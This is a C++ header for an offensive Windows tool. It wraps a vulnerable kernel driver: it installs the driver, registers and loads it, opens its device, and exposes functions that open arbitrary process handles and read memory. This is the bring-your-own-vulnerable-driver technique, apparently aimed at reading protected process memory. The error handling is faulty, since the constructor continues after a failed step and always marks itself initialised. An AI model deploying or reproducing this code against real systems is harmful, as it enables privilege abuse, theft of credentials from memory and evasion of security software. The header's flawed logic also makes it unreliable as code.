#pragma once

#include "vul_driver.h"

class kur_t
{
  vul_driver vul_driver;
  bool is_initialized = false;

public:
  auto query_device_handle() const -> HANDLE;
  auto get_process_handle(DWORD pid, ACCESS_MASK access_mask) -> HANDLE;
  auto read(void* address, void* buffer, size_t buffer_size, HANDLE h_target_process) -> BOOL;

  kur_t(std::wstring name, std::wstring device_name)
    : vul_driver(std::move(name), std::move(device_name))
  {
    if (!vul_driver.install())
    {
      std::cerr << "Deploying driver failed." << std::endl;
    }

    auto status = vul_driver.setup_reg_key();
    if (!status)
    {
      std::cerr << "Setting up registry key to load driver is failed." << std::endl;
      vul_driver.uninstall();
    }

    status = vul_driver.load();
    if (!status)
    {
      std::cerr << "Loading the vulnerable driver failed." << std::endl;
      vul_driver.uninstall();
      vul_driver.delete_reg_key();
    }

    status = vul_driver.get_device_handle();
    if (!status)
    {
      std::cerr << "Getting device handle failed" << std::endl;
      vul_driver.uninstall();
      vul_driver.delete_reg_key();
      vul_driver.unload();
    }

    status = vul_driver.ioctl_initialize_driver();
    if (!status)
    {
      std::cerr << "Getting device handle failed with code: " << GetLastError() << std::endl;
      vul_driver.uninstall();
      vul_driver.delete_reg_key();
      vul_driver.unload();
      CloseHandle(vul_driver.h_device);
    }

    is_initialized = true;
  }

  ~kur_t()
  {
    // first check if the key exists
    const auto status = utils::open_reg_key(HKEY_LOCAL_MACHINE, (SERVICE_PATH_COMMON).c_str());
    if (status != ERROR_SUCCESS)
    {
      if (status == ERROR_FILE_NOT_FOUND)
      {
      }
      std::cerr << "cleanup: key cannot be opened correctly" << std::endl;
    }

    if (vul_driver.h_device != nullptr)
      CloseHandle(vul_driver.h_device);
    // unload the driver
    BOOL st = vul_driver.unload();
    if (!st)
    {
      std::cerr << "cleanup: unloading driver failed" << std::endl;
    }

    // delete the key
    st = vul_driver.delete_reg_key();
    if (!st)
    {
      std::cerr << "cleanup: deleting key failed" << std::endl;
    }

    // delete the driver file
    st = vul_driver.uninstall();
    if (!st)
    {
      std::cerr << "cleanup: uninstalling driver file failed" << std::endl;
    }
  }
};
